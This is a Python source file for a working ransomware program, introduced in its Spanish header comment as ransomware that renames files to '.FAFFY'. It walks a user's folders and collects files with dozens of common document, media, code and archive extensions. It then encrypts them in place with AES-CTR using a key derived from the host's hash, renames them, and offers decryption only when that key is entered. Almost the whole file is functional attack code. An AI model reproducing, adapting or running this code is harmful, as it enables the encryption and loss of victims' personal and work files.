import os
import socket
import hashlib
import random
from Crypto.Util import Counter
from Crypto.Cipher import AES
import shutil

'''Este es un ransomware que cambia la extension a .FAFFY
el problema es que con archivos llamados igual pero de otra extension se sobrescribe por el cambio
de extension (Ej: hola.txt y hola.png)'''

path = os.environ['HOME']
carpetas= os.listdir(path)
carpetas_no_ocultas= [x for x in carpetas if not x.startswith(".")]
extensiones = ['.au','.avi','.bat','.bmp','.class','.csv','.cvs','.java','.doc','.docx','.gif',
               '.jpg','.jpeg','.mov','.pdf','.png','.ppt','.pptx','.psd','.psp','.tar','.txt','.xls','.xlsx',
               '.zip','.rar','.mpeg','.wmv','.wav','.3gp','.mp4','.mp3',
               '.odt','.tex','.mid','.midi','.ogg','.mpa','.7z','.arj','.tar.gz',
               '.bin','.dmg','.dat','.db',
               '.xml','.sql','.email','.ico','.svg','.html','.css','.scss','.js','.asp','.aspx',
               '.ts','.php','.py','.jsp','.pps','.c','.cpp','.h','.sh','.vb','.ods','.xlsm','.mkv']

def check_internet_connection():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(3) #maxima cantidad de espera
    try:
        s.connect(('socket.io',80))
        print("conectado a internet")
        s.close()
    except:
        print("sin conexion a internet")

def discover(key):




    if os.path.exists('key_file'):

        faffy = open('file_faffy_list', 'r')
        f_list = faffy.read().split('\n')
        f_list = [l for l in f_list if not l == ""]
        faffy.close()

        ex = open('extensions_list', 'r')
        ex_list = ex.read().split('\n')
        ex_list = [e for e in ex_list if not e == ""]
        ex.close()


        key1=raw_input("Key: ")
        key_file = open('key_file', 'r+')
        key=key_file.read().split('\n')
        key = ''.join(key)
        if key1==key:
            c = Counter.new(128)
            crypto = AES.new(key , AES.MODE_CTR, counter=c)
            crypt_archivos = crypto.decrypt

            for element,extension in zip(f_list,ex_list):
                base = os.path.splitext(element)[0]
                decrypt(element,base,extension, crypt_archivos)
    else:

        file_list = open('file_list', 'w+')
        extensions_list = open('extensions_list', 'w+')
        # for carpetas in carpetas_no_ocultas:
        # ruta = path+'/'+carpetas
        ruta = '/home/christian/Escritorio/contratos-bolognia'
        for extension in extensiones:
            for rutaabs, directorio, archivo in os.walk(ruta):
                for file in archivo:
                    if file.endswith(extension):
                        file_list.write(os.path.join(rutaabs, file) + '\n')
                        base, exten = os.path.splitext(os.path.join(rutaabs, file))
                        extensions_list.write(str(exten) + '\n')  # extensiones de los archivos
        extensions_list.close()
        file_list.close()

        # copia del archivo para cambiar extensiones
        shutil.copy('file_list', 'faffy_list')
        # cambio de exteniones
        lectura()
        # eliminar copia
        # os.remove('faffy_list')

        lista = open('file_list', 'r')
        l_list = lista.read().split('\n')
        l_list = [l for l in l_list if not l == ""]
        lista.close()


        c=Counter.new(128)
        crypto=AES.new(key,AES.MODE_CTR,counter=c)
        key_file = open('key_file', 'w+')
        key_file.write(key)
        key_file.close()
        crypt_archivos=crypto.encrypt

        for element in l_list:
            encrypt(element,crypt_archivos)

def get_hash():
    hashcomputer=os.environ['HOME']+os.environ['USER']+socket.gethostname()+str(random.randint(0,10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000))
    hashcomputer=hashlib.sha512(hashcomputer)
    hashcomputer=hashcomputer.hexdigest()
    new_key=[]
    for k in hashcomputer:
        if len(new_key)==32:
            hashcomputer=''.join(new_key)
            break
        else:
            new_key.append(k)
    return hashcomputer

def encrypt(archivo,crypto,block_size=16):
    with open(archivo,'r+b') as archivo_enc:
        contenido_sin_cifrar=archivo_enc.read(block_size)
        while contenido_sin_cifrar:
            contenido_cifrado=crypto(contenido_sin_cifrar)
            if len(contenido_sin_cifrar) != len(contenido_cifrado):
                raise ValueError('')
            archivo_enc.seek(-len(contenido_sin_cifrar),1)
            archivo_enc.write(contenido_cifrado)
            contenido_sin_cifrar=archivo_enc.read(block_size)
    #cambiar extension
    base = os.path.splitext(archivo)[0]
    os.rename(archivo, base + ".FAFFY")

def decrypt(archivo,base,extension,crypto,block_size=16):
    with open(archivo,'r+b') as archivo_enc:
        contenido_sin_cifrar=archivo_enc.read(block_size)
        while contenido_sin_cifrar:
            contenido_cifrado=crypto(contenido_sin_cifrar)
            if len(contenido_sin_cifrar) != len(contenido_cifrado):
                raise ValueError('')
            archivo_enc.seek(-len(contenido_sin_cifrar),1)
            archivo_enc.write(contenido_cifrado)
            contenido_sin_cifrar=archivo_enc.read(block_size)
    os.rename(archivo, base + extension)

def lectura():
    with open('faffy_list','rw') as faffy:
        with open('file_faffy_list','w+') as file_faffy:
            for linea in faffy:
                #print linea
                aux = linea.rfind('.')
                nueva_linea = linea[0:aux]
                ex = linea[aux:len(linea)]
                nueva_linea=nueva_linea+'.FAFFY'
                file_faffy.write(nueva_linea+'\n')

    faffy.close()
    file_faffy.close()
def main():
    check_internet_connection()
    hashcomputer=get_hash()
    discover(hashcomputer)

if __name__ == '__main__':
    try:
        main()

    except KeyboardInterrupt:
        exit()